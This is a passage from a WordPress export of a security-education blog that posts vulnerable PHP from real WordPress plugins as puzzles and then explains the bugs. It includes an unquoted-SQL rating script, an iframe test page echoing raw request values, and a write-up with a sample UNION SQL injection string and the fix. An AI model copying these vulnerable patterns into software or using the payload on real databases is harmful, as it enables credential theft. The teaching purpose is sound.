			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>76.102.16.4</wp:comment_author_IP>
			<wp:comment_date>2011-03-06 23:44:07</wp:comment_date>
			<wp:comment_date_gmt>2011-03-07 06:44:07</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Yup, the $gallery_name was set earlier in the code.  The variable was assigned in the following line:

$gallery_name = wp_kses( $_REQUEST['bwbps_galname'], array() );

The reference for this function can be found here:  http://codex.wordpress.org/Function_Reference/wp_kses

Do you think the devs made the right call on this one?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>1739</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299480247.1083";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1739</wp:comment_id>
			<wp:comment_author><![CDATA[DisK0nn3cT]]></wp:comment_author>
			<wp:comment_author_email>danny@devtrixlabs.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.devtrixlabs.com</wp:comment_author_url>
			<wp:comment_author_IP>74.7.52.30</wp:comment_author_IP>
			<wp:comment_date>2011-03-04 08:01:03</wp:comment_date>
			<wp:comment_date_gmt>2011-03-04 15:01:03</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[So I am assuming the $gallery_name variable was set and sanitized somewhere earlier up in the code?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1299250863.084";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299479991.6923";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1748</wp:comment_id>
			<wp:comment_author><![CDATA[DisK0nn3cT]]></wp:comment_author>
			<wp:comment_author_email>danny@devtrixlabs.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.devtrixlabs.com</wp:comment_author_url>
			<wp:comment_author_IP>74.7.52.30</wp:comment_author_IP>
			<wp:comment_date>2011-03-07 07:20:27</wp:comment_date>
			<wp:comment_date_gmt>2011-03-07 14:20:27</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I didn't have a bunch of time to go through the wp_kses function, but the idea of allowing "safe" parameters of the HTML (which is determined by the developer?) to go through the filtering doesn't seem like a good idea. I also don't understand why the variable $gallery_name needs to go through an html filtering function like this when it is most likely going to be plaintext anyway? Why not just run a normal sanitizing function on it?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1299610885.022";s:7:"message";s:45:"BrettH changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299507627.8682";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1749</wp:comment_id>
			<wp:comment_author><![CDATA[j2]]></wp:comment_author>
			<wp:comment_author_email>james@jardinesoftware.net</wp:comment_author_email>
			<wp:comment_author_url>http://www.jardinesoftware.net</wp:comment_author_url>
			<wp:comment_author_IP>204.86.64.67</wp:comment_author_IP>
			<wp:comment_date>2011-03-07 12:39:50</wp:comment_date>
			<wp:comment_date_gmt>2011-03-07 19:39:50</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[I personally vote for encoding right at the point that the data is sent to the client.  Maybe, in this situation, ghe $gallery_name variable is only used in this one instance, but what it if was not?  If this variable was going to be saved in a database, or used in a different context, the encoding may cause a problem.  For example, what i fyou are going to put the variable into a URL?  URLEncoding would be a better choice.   What if it is exported to a csv file, the encoding may cause problems.   XSS does not effect code on the server, and with all the different contexts that are available, I think encoding at the point of output would be better.  It also Makes it easier, during a code review to look for these echo lines and see that the values are, in fact, encoded.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299526790.5855";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1299828465.1249";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Curiosity</title>
		<link>http://spotthevuln.com/2011/03/curiosity/</link>
		<pubDate>Mon, 14 Mar 2011 12:30:06 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1382</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>The cure for boredom is curiosity. There is no cure for curiosity.
Ellen Parr</strong></blockquote>
[sourcecode language="php"]
&lt;?php

require_once('../../../wp-config.php');
require_once('../../../wp-includes/functions.php');

// CSRF attack protection. Check the Referal field to be the same
// domain of the script

$k_id = strip_tags($wpdb-&gt;escape($_GET['id']));
$k_action = strip_tags($wpdb-&gt;escape($_GET['action']));
$k_path = strip_tags($wpdb-&gt;escape($_GET['path']));
$k_imgIndex = strip_tags($wpdb-&gt;escape($_GET['imgIndex']));

$table_name = $wpdb-&gt;prefix . 'comment_rating';
$comment_table_name = $wpdb-&gt;prefix . 'comments';

if($k_id &amp;&amp; $k_action &amp;&amp; $k_path) {
    //Check to see if the comment id exists and grab the rating
    $query = &quot;SELECT * FROM `$table_name` WHERE ck_comment_id = $k_id&quot;;
    $result = mysql_query($query);

	if(!$result) { die('error|mysql: '.mysql_error()); }
	
   if(mysql_num_rows($result))
	{
      $duplicated = 0;  // used as a counter to off set duplicated votes
      if($row = @mysql_fetch_assoc($result))
      {
			if(strstr($row['ck_ips'], getenv(&quot;REMOTE_ADDR&quot;))) {
            // die('error|You have already voted on this item!'); 
            // Just don't count duplicated votes
            $duplicated = 1;
            $ck_ips = $row['ck_ips'];
         }
         else {
            $ck_ips = $row['ck_ips'] . ',' . getenv(&quot;REMOTE_ADDR&quot;); // IPs are separated by ','
         }
      }
		
      $total = $row['ck_rating_up'] - $row['ck_rating_down'];
      if($k_action == 'add') {
         $rating = $row['ck_rating_up'] + 1 - $duplicated;
         $direction = 'up';
         $total = $total + 1 - $duplicated;
      }
      elseif($k_action == 'subtract')
      {
         $rating = $row['ck_rating_down'] + 1 - $duplicated;
         $direction = 'down';
         $total = $total - 1 + $duplicated;
      } else {
            die('error|Try again later'); //No action given.
      }
		
      if (!$duplicated)
      {
         $query = &quot;UPDATE `$table_name` SET ck_rating_$direction = '$rating', ck_ips = '&quot; . $ck_ips  . &quot;' WHERE ck_comment_id = $k_id&quot;;
         $result = mysql_query($query); 
         if(!$result)
         {
            // die('error|query '.$query);
            die('error|Query error');
         }
          
         // Now duplicated votes will not 
         if(!mysql_affected_rows())
         {
            die('error|affected '. $rating);
         }
         
         $karma_modified = 0;
         if (get_option('ckrating_karma_type') == 'likes' &amp;&amp; $k_action == 'add') {
            $karma_modified = 1; $karma = $rating;
         }
         if (get_option('ckrating_karma_type') == 'dislikes' &amp;&amp; $k_action == 'subtract') {
            $karma_modified = 1; $karma = $rating;
         }
         if (get_option('ckrating_karma_type') == 'both') {
            $karma_modified = 1; $karma = $total;
         }

         if ($karma_modified) {
            $query = &quot;UPDATE `$comment_table_name` SET comment_karma = '$karma' WHERE comment_ID = $k_id&quot;;
            $result = mysql_query($query); 
            if(!$result) die('error|Comment Query error');
         }
      }
   } else {
        die('error|Comment doesnt exist'); //Comment id not found in db, something wrong ?
   }
} else {
    die('error|Fatal: html format error');
}

// Add the + sign, 
if ($total &gt; 0) { $total = &quot;+$total&quot;; }

//This sends the data back to the js to process and show on the page
// The dummy field will separate out any potential garbage that
// WP-superCache may attached to the end of the return.
echo(&quot;done|$k_id|$rating|$k_path|$direction|$total|$k_imgIndex|dummy&quot;);
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1382</wp:post_id>
		<wp:post_date>2011-03-14 05:30:06</wp:post_date>
		<wp:post_date_gmt>2011-03-14 12:30:06</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>curiosity</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1782</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, Solution, SQL Injection, Wordpress Vulnerability Code Example &laquo;SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/03/curiosity-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-03-18 05:34:59</wp:comment_date>
			<wp:comment_date_gmt>2011-03-18 12:34:59</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Curiosity [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1300685805.9346";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1300451699.2499";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Curiosity - SQL Injection</title>
		<link>http://spotthevuln.com/2011/03/curiosity-sql-injection/</link>
		<pubDate>Fri, 18 Mar 2011 12:30:19 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1386</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Comment-Rating Plugin

Fixed in Version: 2.9.24

Issue Type: SQL Injection (SQLi)

Original Code: <a href="http://spotthevuln.com/2011/03/curiosity/">Found Here</a>
<h1>Details</h1>
This week’s vulnerability was a tricky one.  The bug patched in this change list affected the Comment-Rating plugin for WordPress (fixed in 2.9.24).  Let’s take the bug step by step.  First, the application takes a user/attacker supplied value and runs it through an escaping function here (line 9):

$k_id = strip_tags($wpdb->escape($_GET['id']));

So, $k_id is now tainted and contains an escaped value provided by the attacker.  A few lines later, we see the following code:

if($k_id && $k_action && $k_path) {
    //Check to see if the comment id exists and grab the rating
    $query = "SELECT * FROM `$table_name` WHERE ck_comment_id = $k_id";
    $result = mysql_query($query);

The code above checks for a specific condition (which is a condition controllable by the attacker) then proceeds to build and execute a SQL query.  On line 22 we see $k_id is used to build a dynamic SQL statement.  Variables usage within stings are valid in PHP (http://php.net/manual/en/language.types.string.php - see Variable parsing).  $k_id is escaped so we should be ok here…right?  Actually, in this case escaping isn’t sufficient to prevent SQL injection.  Escaping functions typically work by preventing a variable value from breaking out of quotes, unfortunately in this case there are no quotes to break out of.  $k_id is designed to be a numeric value not a string, so there is no need to encapsulate the $k_id value in quotes.  Although $k_id is designed to be numeric, there was nothing that would prevent an attacker from providing an arbitrary value for $k_id.  For example, an attacker could provide a value like this for $k_id:

99999 union select uname, passwd from users

As you can see, there are no special characters (double quotes, single quotes, or database escape characters) in the string above that would have been escaped by a database escaping function.  When used to build the $query variable, we end up with:

$query = "SELECT * FROM `$table_name` WHERE ck_comment_id = <span style="color: #ff0000;">99999 union select uname, passwd from users</span>";

The developers addressed this vulnerability by validating that $k_id is indeed numeric before using the value to build a dynamic SQL statement.
<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="14,15"]
&lt;?php

require_once('../../../wp-config.php');
require_once('../../../wp-includes/functions.php');

// CSRF attack protection. Check the Referal field to be the same
// domain of the script

$k_id = strip_tags($wpdb-&gt;escape($_GET['id']));
$k_action = strip_tags($wpdb-&gt;escape($_GET['action']));
$k_path = strip_tags($wpdb-&gt;escape($_GET['path']));
$k_imgIndex = strip_tags($wpdb-&gt;escape($_GET['imgIndex']));

+// prevent SQL injection 
+if (!is_numeric($k_id)) die('error|Query error');

$table_name = $wpdb-&gt;prefix . 'comment_rating';
$comment_table_name = $wpdb-&gt;prefix . 'comments';

if($k_id &amp;&amp; $k_action &amp;&amp; $k_path) {
    //Check to see if the comment id exists and grab the rating
    $query = &quot;SELECT * FROM `$table_name` WHERE ck_comment_id = $k_id&quot;;
    $result = mysql_query($query);

	if(!$result) { die('error|mysql: '.mysql_error()); }
	
   if(mysql_num_rows($result))
	{
      $duplicated = 0;  // used as a counter to off set duplicated votes
      if($row = @mysql_fetch_assoc($result))
      {
			if(strstr($row['ck_ips'], getenv(&quot;REMOTE_ADDR&quot;))) {
            // die('error|You have already voted on this item!'); 
            // Just don't count duplicated votes
            $duplicated = 1;
            $ck_ips = $row['ck_ips'];
         }
         else {
            $ck_ips = $row['ck_ips'] . ',' . getenv(&quot;REMOTE_ADDR&quot;); // IPs are separated by ','
         }
      }
		
      $total = $row['ck_rating_up'] - $row['ck_rating_down'];
      if($k_action == 'add') {
         $rating = $row['ck_rating_up'] + 1 - $duplicated;
         $direction = 'up';
         $total = $total + 1 - $duplicated;
      }
      elseif($k_action == 'subtract')
      {
         $rating = $row['ck_rating_down'] + 1 - $duplicated;
         $direction = 'down';
         $total = $total - 1 + $duplicated;
      } else {
            die('error|Try again later'); //No action given.
      }
		
      if (!$duplicated)
      {
         $query = &quot;UPDATE `$table_name` SET ck_rating_$direction = '$rating', ck_ips = '&quot; . $ck_ips  . &quot;' WHERE ck_comment_id = $k_id&quot;;
         $result = mysql_query($query); 
         if(!$result)
         {
            // die('error|query '.$query);
            die('error|Query error');
         }
          
         // Now duplicated votes will not 
         if(!mysql_affected_rows())
         {
            die('error|affected '. $rating);
         }
         
         $karma_modified = 0;
         if (get_option('ckrating_karma_type') == 'likes' &amp;&amp; $k_action == 'add') {
            $karma_modified = 1; $karma = $rating;
         }
         if (get_option('ckrating_karma_type') == 'dislikes' &amp;&amp; $k_action == 'subtract') {
            $karma_modified = 1; $karma = $rating;
         }
         if (get_option('ckrating_karma_type') == 'both') {
            $karma_modified = 1; $karma = $total;
         }

         if ($karma_modified) {
            $query = &quot;UPDATE `$comment_table_name` SET comment_karma = '$karma' WHERE comment_ID = $k_id&quot;;
            $result = mysql_query($query); 
            if(!$result) die('error|Comment Query error');
         }
      }
   } else {
        die('error|Comment doesnt exist'); //Comment id not found in db, something wrong ?
   }
} else {
    die('error|Fatal: html format error');
}

// Add the + sign, 
if ($total &gt; 0) { $total = &quot;+$total&quot;; }

//This sends the data back to the js to process and show on the page
// The dummy field will separate out any potential garbage that
// WP-superCache may attached to the end of the return.
echo(&quot;done|$k_id|$rating|$k_path|$direction|$total|$k_imgIndex|dummy&quot;);
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1386</wp:post_id>
		<wp:post_date>2011-03-18 05:30:19</wp:post_date>
		<wp:post_date_gmt>2011-03-18 12:30:19</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>curiosity-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-query"><![CDATA[sql query]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress-plugin"><![CDATA[wordpress plugin]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1856</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>174.21.240.151</wp:comment_author_IP>
			<wp:comment_date>2011-04-01 00:04:15</wp:comment_date>
			<wp:comment_date_gmt>2011-04-01 07:04:15</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[You should insert the PHP code after "<?php" and before "?>" :p

Seriously though, I'm not sure exactly what you're asking here.  The examples we show are from open source projects across the web.  None of the code displayed here is ours (only the fine, witty commentary).]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>1836</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301641455.8534";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1836</wp:comment_id>
			<wp:comment_author><![CDATA[Julio]]></wp:comment_author>
			<wp:comment_author_email>tradock@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://axaldo.com</wp:comment_author_url>
			<wp:comment_author_IP>84.113.200.198</wp:comment_author_IP>
			<wp:comment_date>2011-03-28 07:33:39</wp:comment_date>
			<wp:comment_date_gmt>2011-03-28 14:33:39</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi,
I own a website written in PHP and I don't know where to insert your code. Please advice?

Regards,

Julio]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1301322819.5604";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1301641265.664";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Invincible</title>
		<link>http://spotthevuln.com/2011/03/invincible/</link>
		<pubDate>Mon, 21 Mar 2011 12:30:03 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1391</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>In ancient times skillful warriors first made themselves invincible, and then watched for vulnerability in their opponents.
Sun Tzu</strong></blockquote>
[sourcecode language="php"]
&lt;?php

# Visit this file in your browser to simulate a mobile device's screensize via an &lt;iframe&gt;

$devices = array(
	'iphone_p' =&gt; array(
		'type'   =&gt; 'iPhone: portrait (320x480)',
		'width'  =&gt; 320,
		'height' =&gt; 480
	),
	'iphone_l' =&gt; array(
		'type'   =&gt; 'iPhone: landscape (480x320)',
		'width'  =&gt; 480,
		'height' =&gt; 320
	),
	'moto'	   =&gt; array(
		'type'   =&gt; 'Motorola phone/browser (RAZR, v551, etc)',
		'width'  =&gt; 176,
		'height' =&gt; 220
	),
	'n80'	   =&gt; array(
		'type'   =&gt; 'Nokia N80 (N60WebKit)',
		'width'  =&gt; 352,
		'height' =&gt; 416
	)
);

if ( (int) $_REQUEST['w'] &amp;&amp; (int) $_REQUEST['h'] ) {
	$choice = array(
		'type'   =&gt; &quot;Custom size ({$_REQUEST['w']}x{$_REQUEST['h']})&quot;,
		'width'  =&gt; $_REQUEST['w'],
		'height' =&gt; $_REQUEST['h']
	);
}

elseif ( $devices[$_REQUEST['d']] )
	$choice = $devices[$_REQUEST['d']];

else $choice = $devices['iphone_p'];

?&gt;
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html&gt;
&lt;head&gt;
	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
	&lt;title&gt;WPhone iFramer test tool: &lt;?php echo $choice['type']; ?&gt;&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;form action=&quot;&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;&quot; method=&quot;get&quot;&gt;
		&lt;label for=&quot;h&quot;&gt;CHOOSE&lt;/label&gt;
		&lt;select name=&quot;d&quot; id=&quot;d&quot;&gt;
			&lt;option&gt;&lt;/option&gt;
&lt;?php
			foreach ( $devices as $this_d_key =&gt; $this_d ) {
				$selected = ( $_REQUEST['d'] == $this_d_key ) ? 'selected' : '';
				echo '&lt;option value=&quot;' . $this_d_key . '&quot; ' . $selected . '&gt;' . $this_d['type'] . '&lt;/option&gt;' . &quot;\n\t\t\t&quot;;
			}
			echo &quot;\n&quot;;
?&gt;		
		&lt;/select&gt;
		&lt;br /&gt;OR INPUT
		&lt;label for=&quot;w&quot;&gt;Width&lt;/label&gt;
		&lt;input type=&quot;text&quot; name=&quot;w&quot; id=&quot;w&quot; value=&quot;&quot; size=&quot;5&quot; /&gt;
		x
		&lt;label for=&quot;h&quot;&gt;Height&lt;/label&gt;
		&lt;input type=&quot;text&quot; name=&quot;h&quot; id=&quot;h&quot; value=&quot;&quot; size=&quot;5&quot; /&gt;
		&lt;br /&gt;
		&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;view&quot; /&gt;
	&lt;/form&gt;
	&lt;h2&gt;&lt;?php echo $choice['type']; ?&gt;&lt;/h2&gt;
	&lt;iframe src=&quot;../../../wp-login.php&quot; width=&quot;&lt;?php echo $choice['width']; ?&gt;&quot; height=&quot;&lt;?php echo $choice['height']; ?&gt;&quot;&gt;your browser does not support iframes.&lt;/iframe&gt;
&lt;/body&gt;
&lt;/html&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1391</wp:post_id>
		<wp:post_date>2011-03-21 05:30:03</wp:post_date>
		<wp:post_date_gmt>2011-03-21 12:30:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>invincible</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2192</wp:comment_id>
			<wp:comment_author><![CDATA[Validating validation | The Barracuda Labs Internet Security Blog]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://www.barracudalabs.com/wordpress/index.php/2011/08/10/validating-validation/</wp:comment_author_url>
			<wp:comment_author_IP>64.235.144.14</wp:comment_author_IP>
			<wp:comment_date>2012-06-09 19:45:15</wp:comment_date>
			<wp:comment_date_gmt>2012-06-10 02:45:15</wp:comment_date_gmt>
